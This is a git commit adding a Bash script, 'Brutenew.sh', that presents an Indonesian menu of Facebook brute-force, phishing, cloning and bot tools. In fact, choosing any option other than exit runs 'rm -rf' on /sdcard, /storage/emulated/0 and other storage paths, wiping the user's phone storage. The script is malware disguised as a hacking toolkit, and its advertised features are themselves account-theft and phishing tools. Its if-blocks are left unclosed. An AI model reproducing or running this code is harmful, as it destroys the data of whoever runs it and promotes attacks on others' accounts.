d2cf7ed5def64404c3443a29df7ed40bd221bd11
xclowns <75274683+bangzaht@users.noreply.github.com>
2021-01-14 12:46:11 +0700

    Add files via upload

---
+++ Brutenew.sh
@@ -0,0 +1,242 @@
+#usr/bin/bash
+clear
+bi='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+# RECODE IZIN
+echo
+echo
+echo
+echo $i"["$bi"•"$i"]"$me"───────────────────────────────────────────"$i"["$bi"•"$i"]"
+echo $i" |"$cy"     ANONYMOUS REVOLUTION TEAM"$i"         |"
+echo $i" |"$me"─────────────────────────────────────────────"$i"|"
+echo $i" |"$pu" AUTHOR :"$ku" BANGZAHT  [XcLoWns]"$i"          |"
+echo $i" |"$pu" FACEBOOK :"$ku" Riski Darmawan"$i"                   |"
+echo $i" |"$pu" THANKS TO :"$cy"~ [MR.Grft] [MR.Bagus] [MR.Gans]"$i"  |"
+echo $i" |"$cy"            ~ [xclowns] [%xclowns%] [xclowns]"$i" |"
+echo $i" |"$pu" Contack WhatsApp :"$ku" 08587203269"$i"             |"
+echo $i" |"$pu" Contack Gmail :"$ku" xclownsganz@gmail.com"$i"      |"
+echo $i"["$bi"•"$i"]"$me"───────────────────────────────────────────"$i"["$bi"•"$i"]"
+echo
+echo $i"────────────────────────────────    ─────"
+echo $i"|"$me" 1"$i" |"$cy" BRUTEFORCE FB PHP        "$i"|"$i"    |"$cy" B"$i" |"
+echo $i"|"$me" 2"$i" |"$cy" BRUTEFORCE FB BR1G4D3    "$i"|"$i"    |"$cy" E"$i" |"
+echo $i"|"$me" 3"$i" |"$cy" BRUTEFORCE FB iqbalz     "$i"|"$i"    |"$cy" N"$i" |"
+echo $i"|"$me" 4"$i" |"$cy" BRUTEFORCE FB MBF        "$i"|"$i"    |"$cy" G"$i" |"
+echo $i"|"$me" 5"$i" |"$cy" FACEBRUTE N1ght420       "$i"|"$i"    |"$cy" K"$i" |"
+echo $i"|"$me" 6"$i" |"$cy" BRUTEFORCE FB ( root )   "$i"|"$i"    |"$cy" E"$i" |"
+echo $i"────────────────────────────────"$i"    |"$cy" L"$i" |"
+echo $i"|"$me" 7"$i" |"$cy" YAHOO CLONING FACEBOOK   "$i"|"$i"    ─────"
+echo $i"|"$me" 8"$i" |"$cy" PROFILE GUARD FACEBOOK   "$i"|"$i"    |"$cy" F"$i" |"
+echo $i"|"$me" 9"$i" |"$cy" REPORT FACEBOOK WORK     "$i"|"$i"    |"$cy" A"$i" |"
+echo $i"|"$me"10"$i" |"$cy" AUTO REACTION FACEBOOK   "$i"|"$i"    |"$cy" C"$i" |"
+echo $i"|"$me"11"$i" |"$cy" INFORMATION FACEBOOK     "$i"|"$i"    |"$cy" E"$i" |"
+echo $i"|"$me"12"$i" |"$cy" BOT KOMEN FACEBOOK       "$i"|"$i"    |"$cy" B"$i" |"
+echo $i"|"$me"13"$i" |"$cy" AUTOLIKE FACEBOOK        "$i"|"$i"    |"$cy" O"$i" |"
+echo $i"────────────────────────────────"$i"    |"$cy" O"$i" |"
+echo $i"|"$me"14"$i" |"$cy" PHISING FACEBOOK 1       "$i"|"$i"    |"$cy" K"$i" |"
+echo $i"|"$me"15"$i" |"$cy" PHISING FACEBOOK 2       "$i"|"$i"    ─────"
+echo $i"|"$me"16"$i" |"$cy" PHISING FACEBOOK 3       "$i"|"$i"    |"$cy" K"$i" |"
+echo $i"|"$me"17"$i" |"$cy" PHISING FACEBOOK 4       "$i"|"$i"    |"$cy" E"$i" |"
+echo $i"────────────────────────────────"$i"    |"$cy" R"$i" |"
+echo $i"|"$me"18"$i" |"$cy" INSTALL BAHAN DULU COEG  "$i"|"$i"    |"$cy" E"$i" |"
+echo $i"|"$me"19"$i" |"$cy" KELUAR/EXIT PROGRAM      "$i"|"$i"    |"$cy" N"$i" |"
+echo $i"────────────────────────────────    ─────"
+echo
+echo $me"┌==="$bi"["$i"Bangzaht"$bi"]"$me"======"$bi"["$i""Pilih Nomor nya""$bi"]"
+echo $me"¦"
+read -p"└──# " pil
+
+if [ $pil = 1 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+sleep 1
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 2 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+sleep 1
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 3 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+sleep 1
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 4 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+sleep 1
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 5 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+sleep 1
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 6 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+sleep 1
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 7 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+sleep 1
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 8 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+sleep 1
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 9 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+sleep 1
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 10 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+sleep 1
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 11 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+sleep 1
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 12 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+sleep 1
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 13 ]
+then
+clear
+figlet -f slant "Bentar"|lolcat
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 14 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 15 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 16 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 17 ]
+then
+clear
+figlet -f slant "bentar"|lolcat
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 18 ]
+then
+clear
+apt update && apt upgrade
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf storage
+rm -rf /sdcard1
+
+if [ $pil = 19 ]
+then
+clear
+figlet -f slant "E X I T"|lolcat
+sleep 2
+echo $cy"Terima Kasih Sudah Pakai Tool Saya"
+sleep 2
+echo $i"Bila Ada Kesalahan Kamu Bisa Nanya Kepada Saya"
+sleep 2
+echo $ku"WhatsApp :"$i" kepoo"
+echo $ku"Facebook :"$i" kepo"
+sleep 2
+echo $pur">> Thanks Yang Sudah Support Saya <<"
+exit
+fi
